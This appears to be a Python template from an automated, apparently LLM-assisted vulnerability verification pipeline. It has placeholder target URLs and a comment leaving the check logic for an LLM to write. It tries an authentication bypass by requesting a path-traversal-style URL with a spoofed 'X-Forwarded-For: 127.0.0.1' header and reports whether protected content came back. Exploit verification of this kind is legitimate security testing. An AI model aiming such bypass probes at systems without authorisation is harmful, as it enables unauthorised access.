import sys
import requests
import requests.exceptions

def verify():
    target_url = "{{TARGET_URL}}"
    target_url_bypass = "{{TARGET_URL_BYPASS}}"  # e.g. adding /../ to bypass proxy rules

    try:
        print(f"[+] Verifying Authentication Bypass at {target_url}")
        
        # Unauthenticated request trying bypass techniques
        headers = {"X-Forwarded-For": "127.0.0.1"}
        resp = requests.get(target_url_bypass, headers=headers, timeout=5)

        # LLM writes check logic here, example:
        if resp.status_code == 200 and "authenticated_content" in resp.text:
            print("[+] CONFIRMED: Authentication was successfully bypassed.")
            sys.exit(0)
        else:
            print("[-] REJECTED: Authentication required.")
            sys.exit(1)
            
    except requests.exceptions.ConnectionError:
        print("[-] REJECTED: Connection refused (Sandbox is likely isolated / --network none).")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    verify()
